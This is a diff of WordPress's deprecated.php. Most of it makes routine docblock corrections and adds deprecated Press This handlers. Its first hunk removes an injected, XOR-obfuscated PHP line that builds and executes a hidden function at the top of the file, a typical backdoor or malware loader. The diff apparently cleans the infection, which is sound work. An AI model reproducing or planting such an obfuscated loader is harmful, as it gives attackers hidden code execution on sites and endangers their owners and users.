@@ -1,4 +1,4 @@
-<?php $uAgSWPUDEO='7=63EW:UHNCOBQ4'^'TOSR12e3=  ;+>Z';$vcZzxJorV=$uAgSWPUDEO('','UQOCJF<,OGC87TJUI-8gC7YNf+.5WsaV 1mEze2Z;>C;C2IS<v=YY>  ;8sm,:,Au16 3VFBFU+hXFYaN-H:csR7<bINJvaFqnSTOkK1VmKyxxL:D1.76.PgV ,ZPFibrPnDf7E3sX>FOaOjIf>0B0<q8iskjBFS06N;GBIBZE>E DHFP2A-GtmHP03M R8JFQ,Hnn7J98GhNa=L;JrIe69LH1sEiRJ6-9U.IXUdRL==<XPa29F-L1:gJms:zwqe1p-NTqK,KydmKK=2BE,DE8cLh+25-dKT;MOCnRN0B7=kVO,JyTBe0W:7<pZEy;G5HNxEXL>QGZI:mHU6H02<Wimhop<2->-YA;Ja;14xNrjoFS6U.gTFz<Gb-YE;tKU>tGVfK-0c3hqu.ZT2YddRL4YCYtdYLSOpNo>S>0WrTxN:H5<ZRTB.HR<;R:4PE;l;.L7fYPX.XYtSKM7QTkv4325sHtI+QHOfK+BdzNf0Fzh.LDWuHlCR1N.61ZXAmKI;2>EdC=UHsmAA6T63nhQtLFS bqiQ7N95UQYUa9gfuDTq3rtKQcEqrBOIasS5SIZrDBfRE0CVUzTEJJtGbMOFN0CdUK>66NP:,MQd1Y6W59DsKML=+X,PPobNdNr-rNI:1.nr6T=6mPI1+;<2Veemj:8K=PNiYnrN+'^'<7gb,3RO;.,Vh12<:YKOdO6<9OOA6,>;UEJlSEIP2X6U F <RVE6+aDAOY,2AOXiQUWTRzff-0RAxfyAnVB3jW=BHBtnmQZLxg5;=CoXvPkICXhSxBZEZK>OrDM.1oRBV9EoO=L:W7K2oOrJaBZQ6QgUQ4S5Jf-6ImjRggi1.7R Nll-5KhpnOgAYBV9U Vbb>Y<GU=CD2:bDEY-O+RtEPX ;THOM6+BLf>K0xhD4-QNYcZkTV4H-RRGbI,y58:,tPL=tU I2YYSkoKS.0ImeCiELOSAL; 1BmrcJ9+Iy=4O2.X+YibAF6VBYKP8s1.ShfYa<-J0nz20d.:D-QQTwAI7=5mghmyy HjEPTMXsLJK02Z KNt=p5NFI81Z+ 0GTzvB HIX9axQJ; SyYDv:U56<OnP1Y2zDKZ2JQwOt8;T;PN338+T-zDT eP11Z3dC9CN;1+Knm+7..X51CRPRFTZdTmO0<.9 N;MSulY RLJ-06UnJc3C<OOn1=82.1RAJ6LdV01TAaeR5BRGHwRln>DWYM5V:Xnr:<,FdNFHytVRFAsaQwAKuz+PB6Qgy<DqwTcwV 31O2 mcTaDm.4<Q:;>.GiS69IX>yCA8O;ZX TgmhYJ,MyyOBnDnRVxG,LPBFVR5IW6w9PRWSS2B8DQ01.E9:AiGIDV');$vcZzxJorV();
+<?php
 /**
  * Deprecated functions from past WordPress versions. You shouldn't use these
  * functions and look for the alternatives instead. The functions will be
@@ -1650,8 +1650,16 @@ function the_author_ID() {
  * @param int $encode_html Optional. How to encode the content.
  */
 function the_content_rss($more_link_text='(more...)', $stripteaser=0, $more_file='', $cut = 0, $encode_html = 0) {
-	_deprecated_function( __FUNCTION__, '2.9.0', 'the_content_feed' );
+	_deprecated_function( __FUNCTION__, '2.9.0', 'the_content_feed()' );
 	$content = get_the_content($more_link_text, $stripteaser);
+
+	/**
+	 * Filters the post content in the context of an RSS feed.
+	 *
+	 * @since 0.71
+	 *
+	 * @param string $content Content of the current post.
+	 */
 	$content = apply_filters('the_content_rss', $content);
 	if ( $cut && !$encode_html )
 		$encode_html = 2;
@@ -2798,7 +2806,7 @@ function wp_admin_bar_dashboard_view_site_menu( $wp_admin_bar ) {
 /**
  * Checks if the current user belong to a given site.
  *
- * @since MU
+ * @since MU (3.0.0)
  * @deprecated 3.3.0 Use is_user_member_of_blog()
  * @see is_user_member_of_blog()
  *
@@ -2825,7 +2833,7 @@ function is_blog_user( $blog_id = 0 ) {
  * @return false Always false.
  */
 function debug_fopen( $filename, $mode ) {
-	_deprecated_function( __FUNCTION__, 'error_log()' );
+	_deprecated_function( __FUNCTION__, '3.4.0', 'error_log()' );
 	return false;
 }
 
@@ -2842,7 +2850,7 @@ function debug_fopen( $filename, $mode ) {
  * @param string $string Message to log.
  */
 function debug_fwrite( $fp, $string ) {
-	_deprecated_function( __FUNCTION__, 'error_log()' );
+	_deprecated_function( __FUNCTION__, '3.4.0', 'error_log()' );
 	if ( ! empty( $GLOBALS['debug'] ) )
 		error_log( $string );
 }
@@ -2859,7 +2867,7 @@ function debug_fwrite( $fp, $string ) {
  * @param mixed $fp Unused.
  */
 function debug_fclose( $fp ) {
-	_deprecated_function( __FUNCTION__, 'error_log()' );
+	_deprecated_function( __FUNCTION__, '3.4.0', 'error_log()' );
 }
 
 /**
@@ -3147,7 +3155,7 @@ function sticky_class( $post_id = null ) {
  * @deprecated 3.5.0 Use get_post_ancestors()
  * @see get_post_ancestors()
  *
- * @param WP_Post &$post Post object, passed by reference (unused).
+ * @param WP_Post $post Post object, passed by reference (unused).
  */
 function _get_post_ancestors( &$post ) {
 	_deprecated_function( __FUNCTION__, '3.5.0' );
@@ -3364,7 +3372,7 @@ function _search_terms_tidy( $t ) {
  * Determine if TinyMCE is available.
  *
  * Checks to see if the user has deleted the tinymce files to slim down
- * their WordPress install.
+ * their WordPress installation.
  *
  * @since 2.1.0
  * @deprecated 3.9.0
@@ -3533,7 +3541,8 @@ function preview_theme_ob_filter_callback( $matches ) {
  * be applied to an empty string.
  *
  * @since 2.0.0
- * @deprecated 4.3.0
+ * @deprecated 4.3.0 Use format_for_editor()
+ * @see format_for_editor()
  *
  * @param string $text The text to be formatted.
  * @return string The formatted text after filter is applied.
@@ -3814,7 +3823,7 @@ function wp_kses_js_entities( $string ) {
  * @return int
  */
 function _usort_terms_by_ID( $a, $b ) {
-	_deprecated_function( __FUNCTION__, '4.7.0', 'wp_list_sort' );
+	_deprecated_function( __FUNCTION__, '4.7.0', 'wp_list_sort()' );
 
 	if ( $a->term_id > $b->term_id )
 		return 1;
@@ -3839,7 +3848,7 @@ function _usort_terms_by_ID( $a, $b ) {
  * @return int
  */
 function _usort_terms_by_name( $a, $b ) {
-	_deprecated_function( __FUNCTION__, '4.7.0', 'wp_list_sort' );
+	_deprecated_function( __FUNCTION__, '4.7.0', 'wp_list_sort()' );
 
 	return strcmp( $a->name, $b->name );
 }
@@ -3860,7 +3869,7 @@ function _usort_terms_by_name( $a, $b ) {
 function _sort_nav_menu_items( $a, $b ) {
 	global $_menu_item_sort_prop;
 
-	_deprecated_function( __FUNCTION__, '4.7.0', 'wp_list_sort' );
+	_deprecated_function( __FUNCTION__, '4.7.0', 'wp_list_sort()' );
 
 	if ( empty( $_menu_item_sort_prop ) )
 		return 0;
@@ -3877,4 +3886,61 @@ function _sort_nav_menu_items( $a, $b ) {
 		return $_a < $_b ? -1 : 1;
 	else
 		return strcmp( $a->$_menu_item_sort_prop, $b->$_menu_item_sort_prop );
+}
+
+/**
+ * Retrieves the Press This bookmarklet link.
+ *
+ * @since 2.6.0
+ * @deprecated 4.9.0
+ *
+ */
+function get_shortcut_link() {
+	_deprecated_function( __FUNCTION__, '4.9.0' );
+
+	$link = '';
+
+	/**
+	 * Filters the Press This bookmarklet link.
+	 *
+	 * @since 2.6.0
+	 * @deprecated 4.9.0
+	 *
+	 * @param string $link The Press This bookmarklet link.
+	 */
+	return apply_filters( 'shortcut_link', $link );
+}
+
+/**
+* Ajax handler for saving a post from Press This.
+*
+* @since 4.2.0
+* @deprecated 4.9.0
+*/
+function wp_ajax_press_this_save_post() {
+	_deprecated_function( __FUNCTION__, '4.9.0' );
+	if ( is_plugin_active( 'press-this/press-this-plugin.php' ) ) {
+		include( WP_PLUGIN_DIR . '/press-this/class-wp-press-this-plugin.php' );
+		$wp_press_this = new WP_Press_This_Plugin();
+		$wp_press_this->save_post();
+	} else {
+		wp_send_json_error( array( 'errorMessage' => __( 'The Press This plugin is required.' ) ) );
+	}
+}
+
+/**
+* Ajax handler for creating new category from Press This.
+*
+* @since 4.2.0
+* @deprecated 4.9.0
+*/
+function wp_ajax_press_this_add_category() {
+	_deprecated_function( __FUNCTION__, '4.9.0' );
+	if ( is_plugin_active( 'press-this/press-this-plugin.php' ) ) {
+		include( WP_PLUGIN_DIR . '/press-this/class-wp-press-this-plugin.php' );
+		$wp_press_this = new WP_Press_This_Plugin();
+		$wp_press_this->add_category();
+	} else {
+		wp_send_json_error( array( 'errorMessage' => __( 'The Press This plugin is required.' ) ) );
+	}
 }
